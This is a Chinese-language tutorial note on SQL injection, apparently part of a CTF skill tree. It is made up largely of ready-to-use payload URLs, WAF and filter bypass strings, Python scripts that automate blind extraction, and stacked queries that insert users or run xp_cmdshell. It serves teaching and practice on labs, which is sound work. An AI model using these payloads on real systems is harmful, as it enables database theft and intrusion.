# 💉 SQL注入攻击

## 🎯 学习目标
深入理解SQL注入原理，掌握各种注入技术和绕过方法，具备独立挖掘和利用SQL注入漏洞的能力。

## 📚 核心概念

### 什么是SQL注入
**定义**: 通过在应用程序的输入参数中插入恶意SQL代码，欺骗服务器执行非预期的数据库操作。

**产生原因**:
- 用户输入未经过滤直接拼接到SQL语句中
- 使用动态SQL语句构造查询
- 缺乏输入验证和参数化查询

## 🔍 注入类型分析

### [[联合注入]] (Union-based)
**原理**: 利用UNION操作符合并查询结果，获取其他表的数据

#### 基础步骤
```sql
-- 1. 判断注入点
http://target.com/news.php?id=1'

-- 2. 判断字段数
http://target.com/news.php?id=1' order by 3--+
http://target.com/news.php?id=1' order by 4--+  # 报错，说明有3个字段

-- 3. 确定显示位
http://target.com/news.php?id=-1' union select 1,2,3--+

-- 4. 获取数据库信息
http://target.com/news.php?id=-1' union select 1,database(),version()--+

-- 5. 获取表名
http://target.com/news.php?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+

-- 6. 获取列名
http://target.com/news.php?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users'--+

-- 7. 获取数据
http://target.com/news.php?id=-1' union select 1,group_concat(username,0x3a,password),3 from users--+
```

#### 高级技巧
```sql
-- 无列名注入
select 1,2,3 union select * from (select * from users)a limit 1,1

-- 绕过字段数限制
select 1,2,3 union select * from (select 1,2,3,4,5,6)a

-- 利用别名
select 1,2,3 union select * from users as a inner join users as b
```

### [[布尔盲注]] (Boolean-based Blind)
**原理**: 通过构造真假条件，根据页面响应差异判断数据

#### 基础判断
```sql
-- 判断数据库长度
http://target.com/news.php?id=1' and length(database())>5--+  # 正常
http://target.com/news.php?id=1' and length(database())>10--+ # 异常

-- 逐字符猜解数据库名
http://target.com/news.php?id=1' and ascii(substr(database(),1,1))>97--+
http://target.com/news.php?id=1' and ascii(substr(database(),1,1))<122--+

-- 二分法优化
http://target.com/news.php?id=1' and ascii(substr(database(),1,1))>109--+
```

#### 自动化脚本
```python
import requests
import string

def boolean_blind_sqli(url, payload_template):
    """布尔盲注自动化"""
    result = ""
    
    # 获取数据长度
    for length in range(1, 50):
        payload = payload_template.format(f"length(database())={length}")
        if check_true_response(url + payload):
            data_length = length
            break
    
    # 逐字符猜解
    for pos in range(1, data_length + 1):
        for char in string.ascii_letters + string.digits + '_':
            payload = payload_template.format(
                f"ascii(substr(database(),{pos},1))={ord(char)}"
            )
            if check_true_response(url + payload):
                result += char
                break
    
    return result

def check_true_response(url):
    """检查响应是否为真"""
    response = requests.get(url)
    return "Welcome" in response.text  # 根据实际情况调整
```

### [[时间盲注]] (Time-based Blind)
**原理**: 通过延时函数，根据响应时间判断条件真假

#### 基础技术
```sql
-- MySQL延时
http://target.com/news.php?id=1' and if(length(database())>5,sleep(5),0)--+

-- 条件延时
http://target.com/news.php?id=1' and if(ascii(substr(database(),1,1))>97,sleep(3),0)--+

-- 不同数据库的延时函数
-- PostgreSQL: pg_sleep(5)
-- SQL Server: waitfor delay '00:00:05'
-- Oracle: dbms_lock.sleep(5)
```

#### 优化技术
```python
import time
import threading

class TimeBasedSQLi:
    def __init__(self, url, delay=3):
        self.url = url
        self.delay = delay
        self.baseline_time = self.get_baseline()
    
    def get_baseline(self):
        """获取正常响应时间基线"""
        times = []
        for _ in range(5):
            start = time.time()
            requests.get(self.url)
            times.append(time.time() - start)
        return sum(times) / len(times)
    
    def is_delayed(self, payload):
        """检查是否发生延时"""
        start = time.time()
        requests.get(self.url + payload)
        response_time = time.time() - start
        
        return response_time > (self.baseline_time + self.delay - 1)
    
    def extract_data(self, query_template):
        """提取数据"""
        result = ""
        pos = 1
        
        while True:
            found_char = False
            for char in string.printable:
                payload = f"' and if(ascii(substr(({query_template}),{pos},1))={ord(char)},sleep({self.delay}),0)--+"
                
                if self.is_delayed(payload):
                    result += char
                    found_char = True
                    pos += 1
                    break
            
            if not found_char:
                break
        
        return result
```

### [[报错注入]] (Error-based)
**原理**: 利用数据库报错信息泄露数据

#### MySQL报错注入
```sql
-- extractvalue函数
http://target.com/news.php?id=1' and extractvalue(1,concat(0x7e,database(),0x7e))--+

-- updatexml函数
http://target.com/news.php?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1)--+

-- floor报错
http://target.com/news.php?id=1' and (select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2)))--+

-- 几何函数报错
http://target.com/news.php?id=1' and geometrycollection((select * from(select * from(select user())a)b))--+
```

#### 其他数据库报错
```sql
-- PostgreSQL
http://target.com/news.php?id=1' and cast(version() as int)--+

-- SQL Server
http://target.com/news.php?id=1' and convert(int,@@version)--+

-- Oracle
http://target.com/news.php?id=1' and ctxsys.drithsx.sn(1,(select user from dual))=1--+
```

## 🛡️ 绕过技术

### [[WAF绕过]]
**Web应用防火墙绕过技术**

#### 大小写绕过
```sql
-- 原始payload
union select user,password from users

-- 大小写混合
UnIoN SeLeCt user,password FrOm users
```

#### 注释绕过
```sql
-- 内联注释
/*!union*/ /*!select*/ user,password /*!from*/ users

-- 版本注释
/*!50000union*/ /*!50000select*/ user,password /*!50000from*/ users

-- 多行注释
/*union*/ /*select*/ user,password /*from*/ users
```

#### 编码绕过
```sql
-- URL编码
%75%6e%69%6f%6e%20%73%65%6c%65%63%74  # union select

-- 十六进制编码
select 0x61646d696e  # admin

-- Unicode编码
\u0075\u006e\u0069\u006f\u006e  # union
```

#### 空白字符绕过
```sql
-- 空格替换
union/**/select/**/user,password/**/from/**/users
union%0aselect%0auser,password%0afrom%0ausers
union%0dselect%0duser,password%0dfrom%0dusers
union%0cselect%0cuser,password%0cfrom%0cusers
union%09select%09user,password%09from%09users
union%a0select%a0user,password%a0from%a0users
```

#### 关键字绕过
```sql
-- 双写绕过
ununionion seselectlect user,password frfromom users

-- 等价函数替换
substr() → substring() → mid()
ascii() → ord()
length() → char_length()

-- 特殊构造
'union' → 'uni'+'on'
'union' → 'uni'||'on'
'union' → concat('uni','on')
```

### [[过滤绕过]]
**应用层过滤绕过**

#### 引号绕过
```sql
-- 十六进制
select * from users where username=0x61646d696e

-- char函数
select * from users where username=char(97,100,109,105,110)

-- 反引号
select * from `users` where `username`=admin
```

#### 逗号绕过
```sql
-- join绕过
union select * from (select 1)a join (select 2)b join (select 3)c

-- like绕过
select ascii(mid(user(),1,1)) like 114

-- case when绕过
select case when ascii(mid(user(),1,1))=114 then 1 else 0 end
```

#### 等号绕过
```sql
-- like操作符
select * from users where username like 'admin'

-- regexp操作符
select * from users where username regexp '^admin$'

-- between操作符
select * from users where id between 1 and 1
```

## 🔧 高级技术

### [[二次注入]]
**原理**: 恶意数据先被存储，后在其他功能中被执行

```sql
-- 第一步：注册用户名包含恶意代码
username: admin'--

-- 第二步：修改密码时触发注入
UPDATE users SET password='newpass' WHERE username='admin'--'
-- 实际执行：UPDATE users SET password='newpass' WHERE username='admin'--
```

### [[宽字节注入]]
**原理**: 利用字符编码差异绕过转义

```sql
-- GBK编码环境
-- 输入：1%df' union select 1,user(),3--+
-- 转义后：1%df\' union select 1,user(),3--+
-- GBK解码：1運' union select 1,user(),3--+
-- %df%5c = 運（GBK编码）
```

### [[堆叠查询]]
**原理**: 执行多条SQL语句

```sql
-- 基础堆叠
1'; insert into users values(1,'hacker','password')--+

-- 创建表
1'; create table temp(id int,data varchar(100))--+

-- 执行存储过程
1'; exec xp_cmdshell 'whoami'--+
```

## 🔗 知识关联

### 与其他攻击技术的关系
- [[SQL注入]] → [[文件读写]] → [[代码执行]]
- [[SQL注入]] → [[信息收集]] → [[权限提升]]
- [[SQL注入]] → [[数据库提权]] → [[系统控制]]

### 防护技术关联
- [[参数化查询]] - 根本防护方法
- [[输入验证]] - 第一道防线
- [[WAF防护]] - 网络层防护
- [[最小权限原则]] - 减少危害

## 📊 技能等级

### 入门级 🔴
- [ ] 理解SQL注入原理
- [ ] 掌握基础联合注入
- [ ] 能使用SQLMap工具

### 进阶级 🟡
- [ ] 掌握各种盲注技术
- [ ] 能手工挖掘注入点
- [ ] 理解WAF绕过原理

### 高级 🟢
- [ ] 能绕过复杂WAF
- [ ] 掌握二次注入等高级技术
- [ ] 能开发自动化工具

### 专家级 🔵
- [ ] 发现新的注入技术
- [ ] 研究数据库新特性
- [ ] 贡献开源工具

## 🛠️ 实战工具

### 自动化工具
- **SQLMap** - 最强大的SQL注入工具
- **jSQL Injection** - 图形化注入工具
- **NoSQLMap** - NoSQL注入工具

### 手工测试
- **Burp Suite** - 抓包改包
- **OWASP ZAP** - 开源安全测试
- **Postman** - API测试

### 靶场练习
- **SQLi-Labs** - SQL注入练习平台
- **DVWA** - 综合漏洞靶场
- **Pikachu** - 中文漏洞练习平台

## 🏷️ 标签
`#SQL注入` `#Web安全` `#数据库安全` `#渗透测试` `#漏洞利用`

## 📚 学习资源
- [[SQL注入攻防指南]] - 系统学习资料
- [[数据库安全基础]] - 理论知识
- [[Web安全测试方法]] - 实践技能
- [[CTF-Web题目集]] - 实战练习

---
**导航**: [[CTF技能树]] | [[Web安全]] | [[XSS跨站脚本]] | [[文件上传漏洞]]
